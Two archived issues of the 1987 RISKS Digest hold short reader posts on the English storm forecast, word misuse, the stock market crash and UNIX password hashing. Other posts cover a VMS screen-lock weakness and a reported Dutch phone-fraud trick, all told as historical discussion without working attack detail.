<DOC>
<DOCNO>WT11-B30-1</DOCNO>
<DOCOLDNO>IA012-000130-B021-220</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.49.html 128.240.150.127 19970217013839 text/html 22567
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:37:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 49</TITLE>
<LINK REL="Prev" HREF="/Risks/5.48.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.50.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 49</H1>
<H2> Monday, 26 October 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Freak winds in southern England 
</A>
<DD>
<A HREF="#subj1.1">
sufrin
</A><br>
<A HREF="#subj1.2">
 Franklin Anthes
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  On the Risks of Using Words That Sound Similar 
</A>
<DD>
<A HREF="#subj2.1">
Bruce N. Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  CD, Terrorism, Stocks 
</A>
<DD>
<A HREF="#subj3.1">
Jim Anderson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  The Stock Market Computers and SDI 
</A>
<DD>
<A HREF="#subj4.1">
Bob Berger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  (Almost too much of) Password Encryption 
</A>
<DD>
<A HREF="#subj5.1">
Matt Bishop
</A><br>
<A HREF="#subj5.2">
 Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Phone Service Degradation -- and 911 
</A>
<DD>
<A HREF="#subj6.1">
R.M. Richardson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  INUSE.COM Program 
</A>
<DD>
<A HREF="#subj7.1">
Chris McDonald
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Free phone-calls 
</A>
<DD>
<A HREF="#subj8.1">
E. van Batenburg
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Freak winds in southern England
</A>
</H3>
<address>
&lt;<A HREF="mailto:sufrin%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK">
sufrin%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Sat Oct 24 23:56:06 1987
</i><PRE>

I wonder what the average English resident would have done if there
HAD been advanced warning of last week's hurricane? My guess is
that the most probable reactions would have been something like:

	1. Don't be silly; this is England.         

	2. Let's take the kids outside and watch.

The Oxford Literati would of course have rushed around quoting
Bernard Shaw (Pygmalion) to the effect that

	"In Hereford, Hertford and Hampshire, hurricanes hardly happen".

"I must go and tie the roof of my house down, and make sure that my
neighbours' chimneys and trees are all secure" comes in way at the
bottom of my list of likely reactions, and I can't help asking what the
emergency services or the utility companies COULD have done if they
had known a few hours earlier (apart from cancelling leave).

Perhaps the weather forecasters did us all a favour! There would have
been many more casualties if there had been a lot of people outside
watching. There may even have been more casualties from panic if the
forecasters had known and had made clear what to expect, and where
to expect it. Certainly neither the military nor the civilian emergency
forces here are prepared for mass evacuations of the kind that might
have saved some of the lives that were lost. (They usually claim to be
astonished when it snows more than a couple of inches in an evening).

Do I hear you ask "what's this got to do with the risks of using
computers?" I worked very late at the computing Lab on the eve of the
Hurricane, tumbled into bed at about 2:30am, and slept through the
whole thing.

</PRE>
<HR><H3><A NAME="subj1.2">
Freak winds in southern England
</A>
</H3>
<address>
Franklin Anthes
&lt;<A HREF="mailto:mcvax!geocub!anthes@uunet.UU.NET ">
mcvax!geocub!anthes@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 23 Oct 87 14:50:12 +0200
</i><PRE>
Organization: Greco de programmation, Bordeaux France

 Maybe it was unexpected in the UK, but here in France there were storm
warnings on the midday news. They said that a very strong storm was forecast,
and sure enough that night some parts of France had 220km/h winds.

 I know that "la meteorologie nationale" here in France has a Cray for their
forecasting. Maybe the UK doesn't have such high-powered computers? Or maybe
French weather forecasters are just better:-):-)

	Frank Anthes-Harper
Usenet: ....!ucbvax!decvax!uunet!mcvax!inria!geocub!anthes

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
On the Risks of Using Words That Sound Similar
</A>
</H3>
<address>
Bruce N. Baker 
&lt;<A HREF="mailto:BNBaker@KL.SRI.Com">
BNBaker@KL.SRI.Com
</A>&gt;
</address>
<i>
Mon 26 Oct 87 09:41:59-PST
</i><PRE>
To: Neumann@csl.sri.com

In RISKS 5.48, Richard S.D. D'Ippolito points out the substitution of the
word "casual" where "causal" was intended.  The difference is significant.
I see more and more of this type of problem as we become dependent on
spelling checkers that accept properly spelled words even though they 
completely distort the meaning.  Words that sound similar and look similar
to a secretary are especially a problem.  

In the same issue, Scot E. Wilcoxon's contribution regarding Phone Service
Degradation and 911 uses the word "exasperated" when "exacerbated" was 
intended.  The meaning still comes through, and in a few years, if enough 
secretaries type the one word when it should have been the other, the two will 
appear as synonyms, similar to the way "scan" and "skim" have evolved.
"Apprise" and "appraise", and "foundering" and "floundering" will soon suffer
the same fate.  No one seems to understand "affect" vs. "effect" anymore so
we might as well list them as alternative spellings of the same word.  It
might be a bit more dangerous when we equate "enervating" and "invigorating".
Not even Webster seems to care about preserving the distinction between
"aggravate" and "irritate".  Of course, Webster merely reflects the bad usage
we impose on our language, and often secretaries merely mirror the bad usage
of the writing they receive.  So now "terrific" lists just about any context
you may wish to give the word.  But surprisingly, "livid" does not equate
with "angry" in my 1971 version of Webster.  Surely, that has been "corrected"
by now.  "Erstwhile" still does not have "distinguished" as one of its 
meanings so maybe there is some hope.

I guess my point of all of this is that some of us still care about the 
original intent of words.  No, this will not make the transition to the 
original intent of the framers of the Constitution.  As a former professor,
I was astounded at how many students were upset by my corrections to their
grammar.  Often, I heard, "I didn't know we were supposed to proofread our
papers," or "I didn't realize this was an English class, I thought it was
a course in the business school."

How vulnerable I am.  I am sure there must be at least 10 errors in word usage
and "grammer" here, but that won't "effect" me at all.

   [I try to fix obvious screwups when possible.  There are times (such as
   today) when I have a very limited window on-line (and 40 backlogged
   messages -- too many of them on UNIX passwords).  This afternoon I had a 
   net connection that would give me only a few echoed characters, sometimes
   with more than five-minute delays.  PLEASE try to edit your own messages
   more carefully, and don't be surprised when your incoherent contributions
   are not included.  Also, I'm getting a lot of UNIX password stuff that
   heavily duplicates earlier messages.  I can guess that some of you are
   still getting mail many days late...  or just don't like to read.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 CD, Terrorism, Stocks (Previous 3 RISKS)
</A>
</H3>
<address>
&lt;<A HREF="mailto: JPAnderson@DOCKMASTER.ARPA">
 JPAnderson@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 23 Oct 87 15:08 EDT
</i><PRE>

The last 3 RISKS prompted some responses.

Re:  "Civil Disobedience"

From what I have seen this kind of behavior is not very CIVIL!  It is
also an example of the debasement of the language (language in the pits)
practiced by certain newspapers and even radio and TV stations --
euphemisms to replace (and distort) reality.  "Civil Disobedience" is
actually at the minimum a misdemeanor called Disturbing the Peace.
Unders some circumstances, I would agree with the writer who claimed it
was terrorism.  Certainly mobs, no matter how well intentioned are not
engaged in CIVIL behavior.  Often, these little excursions boder on
riots.  Of course, they are not called any of these things, particularly
since newspapers, radios and TV started calling strikes (often illegal,
and unauthorized) 'Job Actions'.  When I was growing up, most of the
'Job Actions' of Teachers, Civil Servants of various kinds and other
employee groups (like the NFL players) were called strikes, or sometimes
WILDCAT strikes (meaning they were illegal and/or unsanctioned by the
parent organization).  So, spare me the "Civil Disobedience", "Job
Actions", and while we are at it, "Methodology".

Re:  Stocks into Bondage

It is interesting, considering the volume and panic, that the NYSE
computer systems did NOT fail, even though they were sure overloaded,
and continued to be a couple of hours late in reporting trades.  An
'atta boy" to the designers and implementers of those systems.

Cheers, Jim

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
The Stock Market Computers and SDI
</A>
</H3>
<address>
Bob Berger
&lt;<A HREF="mailto:berger@datacube.com ">
berger@datacube.com 
</A>&gt;
</address>
<i>
Sun, 25 Oct 87 20:28:48 EST
</i><PRE>

I hope that the experience of a large network of computers doing something
unplanned for such as accelerating the crash of the stock market will make
the "Decision Makers" stand up and take notice!

The network of computers that makes up the stock trading system is much less
complicated than what the SDI planners are calling for, yet the stock
computers behaved in unexpected ways that were bad for most people involved.
In this case it was only that some people lost millions and a major fracture
had been put in the stability of Western Society's economic structure.....
				Bob Berger 

Datacube Inc. Systems / Software Group	4 Dearborn Rd. Peabody, Ma 01960
VOICE:	617-535-6644;	FAX: (617) 535-5643;  TWX: (710) 347-0125
UUCP:	berger@datacube.COM,  rutgers!datacube!berger, ihnp4!datacube!berger
	{cbosgd,cuae2,mit-eddie}!mirror!datacube!berger

       [Remember, Jim is talking about the transaction processing and Bob
       is talking about programmed trading feedback instabilities...  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
(Almost too much of) Password Encryption
</A>
</H3>
<address>
Matt Bishop 
&lt;<A HREF="mailto:bishop%bear.dartmouth.edu@RELAY.CS.NET">
bishop%bear.dartmouth.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Sun, 25 Oct 87 10:30:28 EST
</i><PRE>

   A little comment on UNIX password encryption.  It may be very redundent.
        [Yes, it is, but perhaps if people will read it, they will stop
        submitting suboptimal communications.  PGN]

In RISKS 5.48, "Russ_Housley.XOSMAR"@Xerox.COM asks if the "modified DES"
is a one-way hash.  Nope.  The modified DES just encrypts the null message
(all 0's) with the password as key and maps the result to a 64-character
alphabet.  That, plus a code indicating which modification is used, is
stored on line.  When a user logs in the password he supplies is used to
repeat this procedure, and the result of that is compared to the (stored)
value.  If they agree, the password is right and the user is logged in.
If not, the password is not correct and the user is not logged in.

The modification, incidentally, is to perturb the E table in one of 4096
ways and apply that DES 25 times in succession.  (That is, the output of
the first is the message for the second, the key being the password in all
iterations.)   The idea is that the perturbation prevents dictionary
searches for a large number of passwords by forcing the password algorithm
to be run once for each possible password AND for each already-encrypted
password (that is, instead of just encrypting a 25,000 word dictionary
and comparing the result against each of 100 encrypted passwords, an attacker
has to encrypt the 25,000 word dictionary once for each encrypted password;
this is equivalent to 2,500,000 encryptions.)  Hence, the time for such
a search should be unacceptably high.

Matt Bishop

bishop%bear.dartmouth.edu@relay.cs.net
...!decvax!dartvax!bear!bishop

</PRE>
<HR><H3><A NAME="subj5.2">
UNIX Passwords
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Fri, 23 Oct 87 22:49:32 EDT
</i><PRE>

&gt; The truncation of UNIX passwords to 8 characters is not a bug, it's a
&gt; feature.  If you have source, examine the code to libc/gen/crypt.c.
&gt; Your password is *not* actually encrypted on UNIX.  Rather, it is used
&gt; as the *key* to encrypt a standard block of text ...

and since DES has 56-bit keys, the password has to be reduced to 8 7-bit
characters.  True, but taking the *first 8* characters is about the worst
method I can think of for reducing a long password to 56 bits!  I've never
been satisfied with this aspect of UNIX; I want 12 significant characters
in my passwords (and all alphabetic, please, so I can type them *fast*).

Taking the *last* 8 characters would be a distinct improvement, because
it's necessary to pause a moment before entering the password, and people
tend to use that moment to reach for the first key or two of the password.

Better yet would be to use a simple hashing function to map the long
password onto the 56-bit space.  Even something as simple as XORing
the 1st, 9th, 17th, etc. characters into the first 7 bits, and likewise
for the other positions, will ensure that any small change to any
part of the password generates an incorrect password.  With a space of
72,057,594,037,927,936 hash buckets, it makes no practical difference that
there are now many alternate passwords that yield the same 56-bit sequence.

(The same technique would also be useful for any banks that come to their
senses and allow 12-digit PINs for ATM use -- around here they're all either
4 or 6 as far as I know, and mostly without privacy shields on the keypads
-- but which think it's much too much work to change their file format.)

It also wouldn't hurt to "personalize" and keep secret the "standard block
of text" that is encrypted using the 56-bit key; this would inhibit
some kinds of password searching done on a different UNIX machine by someone
who gets a copy of the password file (with the "encrypted passwords").
This is best done when the machine is acquired, as it invalidates all
existing passwords.

Any of the steps described above would make it impossible to simply
copy a password file onto, or from, an unmodified UNIX system and use it.
Whether this is an advantage or disadvantage depends on the situation.

Mark Brader, SoftQuad Inc., Toronto, utzoo!sq!msb, msb@sq.com

	If ... it seems easier to subvert UNIX systems than most other systems,
	the impression is a false one.  The subversion techniques are the same.
	It is just that it is often easier to write, install, and use programs
	on UNIX systems than on most other systems, and that is why the UNIX
	system was designed in the first place.
				-- Frederick T. Grampp &amp; Robert H. Morris

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Phone Service Degradation -- and 911
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
25 Oct 87 21:48:09 PST (Sunday)
</i><PRE>
To: umn-cs!sewilco@datapg.MN.ORG (Scot Wilcoxon)
Cc: RISKS@csl.sri.com, RMRichardson.PA@Xerox.COM
From: Rich &lt;RMRichardson.PA@Xerox.COM&gt;

From: umn-cs!sewilco@datapg.MN.ORG (Scot Wilcoxon)
&gt; I will be suggesting to the Minnesota Public Utilities Commission 
&gt; that they try to have 911 protected from this kind of problem.  I 
&gt; think the way to reduce giving a delayed dial tone to everyone is 
&gt; to try to give greater delays to people trying to dial a number 
&gt; causing an overload.  Preferably also give even greater delays to 
&gt; repeat callers or autodialers.  Presently the local carrier is 
&gt; required to give equal service to everyone, even if that means 
&gt; giving equally bad service.

Pardon me, but there seems to be an assumption in here that just isn't true.
When you say "... give greater delays to people trying to dial a number
causing an overload," you are assuming the telephone exchange knows which
number is to be called before it gives a dial tone to the caller.  But you
see, the dial tone is given so the caller may send the number to be called
to the exchange.  If the exchange can predict the number to be called, dial
tones are unnecessary (along with half the equipment in your phone!).
                                                                       Rich

   [Hmm... I interpreted the suggestion as delaying the NEXT dial tone.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
INUSE.COM Program
</A>
</H3>
<address>
Chris McDonald  STEWS-SD 678-2814 
&lt;<A HREF="mailto:cmcdonal@wsmr05.ARPA">
cmcdonal@wsmr05.ARPA
</A>&gt;
</address>
<i>
Mon, 26 Oct 87  7:56:32 MST
</i><PRE>
To: risks@csl.sri.com

As a matter of policy we require automatic timeout features on our systems,
where feasible, to disconnect inactive terminals.  The thinking is that in most
cases an "inactive" terminal in our environment denotes that a user has left
his or her device unattended.  Hopefully the timeout program may save a user
from his or her own carelessness and preclude another person from
"masquerading".

You might expect that not all users are that enthusiastic about the program.
On some of our VMS hosts several personnel use a DCL command file generally
named INUSE.COM.  The program formats the screen to show "Terminal in Use"
in theory one must know the password to then gain access to the terminal.  At
least that was what many users thought!

When we finally began to install the Version 4 update of VMS, we found that DEC
had implemented a recall function.  By entering a Ctrl Y and pressing the up
arrow on the terminal a user could recall the last input to the screen.  So
logically, if the last input was the password, then . . .?

We found it rather ironic that users thought they had protected themselves and
defeated our automatic timeout program at the same time.  The INUSE.COM program
can be modified to address the recall function.  

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Free phone-calls
</A>
</H3>
<address>
    
&lt;<A HREF="mailto:SBQBEB%HLERUL57.BITNET@wiscvm.wisc.edu">
SBQBEB%HLERUL57.BITNET@wiscvm.wisc.edu
</A>&gt;
</address>
<i>
Mon, 26 Oct 87 14:35 N
</i><PRE>
To:       Neumann@KL.SRI.Com

E.van Batenburg, Instituut v.Theoretische Biologie, Groenhovenstraat 5
2321BT Leiden Holland (tel.071-132298)

The Dutch "Personal Computer Magazine" revealed in its september issue
how hackers in Holland managed to fool the telephone company and got
free phone-calls to everywhere in the world.
First they ring 06 which announces to the Dutch telephone computer that
a "collect" call is to be dialed.
Next they choose a number in Denmark (which one was
unfortunately/fortunately, depending on your point of view, not
revealed) which let the Danish computer reply to Holland that the call
is accepted.
Finally they dial their proper destination.

The Dutch telephone company reacted rather grumpy to this disclosure.
They stated that PCM is stimulating abuse of the telephone.
According to them they have no means to correct this on short notice
because the Danish computer is at fault and they are waiting for a
complete overhaul of the Danish telephone computer.

It is not clear who (if anybody) is paying the costs for those calls.
                       Eke van Batenburg

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-2</DOCNO>
<DOCOLDNO>IA012-000130-B021-232</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.50.html 128.240.150.127 19970217013848 text/html 14094
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:37:19 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 50</TITLE>
<LINK REL="Prev" HREF="/Risks/5.49.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.51.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 50</H1>
<H2> Tuesday, 27 October 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Weather 
</A>
<DD>
<A HREF="#subj1.1">
Willis Ware
</A><br>
<A HREF="#subj1.2">
 Geoff Lane
</A><br>
<A HREF="#subj1.3">
 Eugene Miya
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Civil disobedience 
</A>
<DD>
<A HREF="#subj2.1">
David Redell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Reported Japanese Autopilot Problems 
</A>
<DD>
<A HREF="#subj3.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Amusing bug: Business Week Computer (F)ails 
</A>
<DD>
<A HREF="#subj4.1">
GW Ryan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Television series "Welcome to my world" 
</A>
<DD>
<A HREF="#subj5.1">
Clive Feather
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Weather (Re: RISKS 5.45)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 27 Oct 87 10:46:00 PST
From: willis@rand-unix.ARPA

Here's a contribution to the big blow in England.  I was scheduled to
land at Heathrow the morning of the 16th and we sat at Dublin for 6 hours
waiting for the storm to clear. The weather at Dublin was clear and calm.

My comments are based on my participating in an NRC study for NOAA a few
years back; it concerned future needs for computer support to weather
models.  I'm giving you this from memory but I'm sure that the general
facts are correct.

Within the last 10-15 years or so, there were two examples of severe
weather in this country that forecasters missed: the Johntown flood in
western Pennsylvania from unprecedented rains, and the big blizzard in the
Northeast, which interestingly had been forecast by a smallish private
weather service used by some of the trucking companies.  The explanation
from the weather types was that each of them had been a mesoscale
phenomenon -- too small to be included or visible in the global weather
models but too large to fall within the capabilities of local forecasters.

The mesoscale effects seemingly had been overlooked by the WX types and
had just been appreciated at the time we were doing our study.

The large 5-day weather models which typically run once or twice each day
on some huge computer are upper atmosphere models.  They work at a
prescribed pressure profile which it seems to me is 200 millibars,
corresponding roughly to jet altitudes.  As such they predict the large
effects in weather patterns.

The local forecaster uses inputs from satellites, from the large models,
and from local and nearby data sources.  But his ability to predict is
limited to an area perhaps 100 miles or so across.

The mesoscale phenomena are a few-to-several hundred miles in extent and
are lower atmosphere behavior.  The WX types have two problems in getting
models to handle them: first, building the models themselves which must
include things that the upper atmosphere models can ignore (e.g.,
topographic effects, ground-air heat transfer, effects of large lakes
and/or rivers), and getting the data to drive the models.  The models will
have to have a very fine mesh to handle the detail needed, and
consequently the data sources will also have to be fine grained.

As of 7-10 years ago, the work on the models was just starting.  I do not
know the present status.

I suspect that the London and southern England storm was mesoscale
in size.  It definitely was neither a tornado nor a hurricane although both
labels were used by the media.  It clobbered an area a few hundred miles
across but Ireland was untouched.  In addition since the English weather
often comes from the west, there is a lack of weather observations to
drive any models or forecasts.  Aircraft are too high for the observations
needed by mesoscale models, and surface vessels do not normally send up WX
balloons nor take the usual WX measurements.

The damage to London and southern England was stupendous.  Some of the
parks (e.g., Hyde Park) were closed because of the amount of downed
trees, broken branches and trash.  Flooding was extensive and one train
ran into a river when the undermined bridge gave way.  Winds in London
were the highest ever recorded.  The problems continued through the
following week.  Reporting on the telly was confined primarily to
damage; there were only a few comments about the failure to forecast but
no recriminations or blaming.  No mention of mesoscale effects either.

Relevance of all this to RISKS:  you never can be sure how well a model
represents the real world that it purports to describe and mimic.

---------------------------------------

Date:       Tue, 27 Oct 87 11:29:35 GMT
From: "ZZASSGL" &lt;ZZASSGL@CMS.UMRCC.AC.UK&gt;
To: risks@csl.sri.com
Subject:    Weather Prediction in UK

 1. The UK met office uses a Cyber 205 to prepare its forecasts - It also
    predicted bad weather over north France.  The problem was that the
    weather had not read the forecast and moved north very rapidly after the
    last forecast run of the day.
 2. Without exception the British press has blamed the "computer" for the
    lack of warning of bad weather.  Now we all know that unless there was
    some sort of hardware problem(which there wasn't) it is the software
    that may, and only may, be at fault.  Is this confusion a "risk"?
    It is certainly a misconception and if future funding of the UK Met
    office is cut as a result is will surely be a risk to all the people
    who depend on the very good work that is done there.

  Geoff. Lane.
  University of Manchester Regional Computer Centre

</PRE>
<HR><H3><A NAME="subj1.2">
Weather and terrorism (separate)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 27 Oct 87 11:12:48 PST (Tue)
From: eugene@ames-nas.arpa

&gt;  Cyber 205 supercomputer as part of its investigation following last week's
&gt;  hurricane-force winds.  The office has been criticised for failing to
&gt;  predict the speed and path of the storm...
&gt;
&gt;My understanding is the main reasons for lack of success in predicting
&gt;the winds were a) lack of data (the storm came from over the sea --
&gt;fairly normal in Britain! -- where there are few weather stations) and
&gt;b) lack of computing power (and lack of good algorithms?).

Please don't completely equate computing power to the problem of these
models.  Also don't blame machine manufacturer (we have both a 205 and
an X-MP/48).  There was a recent Scientific American article on the problems
of weather models (cover was a grid), but a better article appears:

%A Joseph J. Tribbia
%A Richard A. Anthes
%Z NCAR
%T Scientific Basis of Modern Weather Prediction
%J Science
%V 237
%N 4814
%D 31 July 1987
%P 493-499

There is a specific section on why forecasts are inaccurate.  It's not
just algorithms.  The equations of weather are basically good equations.
Read the article, its more detailed than I wish to summarize here.

&gt;Subject: Terrorism (Re: <A HREF="/Risks/5.45.html">RISKS-5.45</A>)
&gt;
&gt;The computer center at U.C. Santa Barbara was taken over by protesters in
&gt;the spring of '75. Although the computer room was secured behind locked 
&gt;. . .
&gt;One operator inside shut the machine down immediately. Then the protesters
&gt;ushered (all?) the operators out, and took over the entire building - taping
&gt;printouts over all the windows and doors. They threatened to destroy the
&gt;computer if their demands (more money for radical leftist groups) weren't met.
&gt;
&gt;Bill Swan	sigma!bill

Hi Bill--
Yes, Don Davis told us about when he was kicked out.  I did not recall
it was for "radical leftist groups," unless you count the Chicano Studies
program as such.  We have to be careful in distinguishing political judgments.
(Are computer people naturally conservative?)

My suggestion is that if the original requester is interested
in acts of terrorism against computers, contact Computerworld
or maybe Donn Parker (SRI) might have a list.  CW did publish
a list of acts including the bombing (and death) at Wisconsin in
the 1970s, and several bombings in Europe.  Happens ALL the time.

--eugene miya

</PRE>
<HR><H3><A NAME="subj1.3">
Civil disobedience
</A>
</H3>
<address>
David Redell
&lt;<A HREF="mailto:redell@src.dec.com ">
redell@src.dec.com 
</A>&gt;
</address>
<i>
Tue, 27 Oct 87 11:18:05 PST
</i><PRE>

Re: Jim Anderson's complaints about the term "Civil Disobedience"

One may admire or despise some or all acts or practitioners of civil
disobedience, but it's simply incorrect to claim that the term stems
from efforts of contemporary newspapers, radio and TV to distort reality
with euphemisms implying polite behavior.  The term originated in the
mid-19th Century and has nothing to do with "civil" as in "civility".
It is based on "civil" as in "civil rights" or "civil servant" -- that is

 civil (adj) 1 a: of or relating to citizens;  b: of or relating to
       the state or its citizenry;... 5: of, relating to, or involving
       the general public...

Dave Redell

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Reported Japanese Autopilot Problems
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 27 Oct 87 19:53:14 -0800
From: Nancy Leveson &lt;nancy%murphy.uci.edu@ROME.UCI.EDU&gt;

Last week somebody told me that Dan Rather had reported that a Japanese
plane, the MU-2, has had 100 crashes which have now been traced to a
computer problem.  Supposedly, the computerized autopilot will, under 
certain conditions, not let the pilot have control back.  I did not hear 
this myself and since nobody has reported it in Risks, I have a suspicion 
that the story is not correct.  Did anyone hear the Dan Rather telecast?

Nancy

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Amusing bug: Business Week Computer (F)ails
</A>
</H3>
<address>
GW Ryan 
&lt;<A HREF="mailto:gwr@garage.nj.att.com">
gwr@garage.nj.att.com
</A>&gt;
</address>
<i>
24 Oct 87 13:03:31 EDT (Sat)
</i><PRE>
To: RISKS@csl.sri.com

